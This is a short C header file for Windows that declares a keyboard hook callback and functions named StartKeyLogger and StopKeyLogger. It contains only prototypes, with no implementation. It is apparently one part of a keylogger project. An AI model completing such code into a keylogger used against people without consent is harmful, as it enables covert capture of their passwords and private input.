#ifndef HOOKS_H
#define HOOKS_H

#include <windows.h>

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void StartKeyLogger();
void StopKeyLogger();

#endif
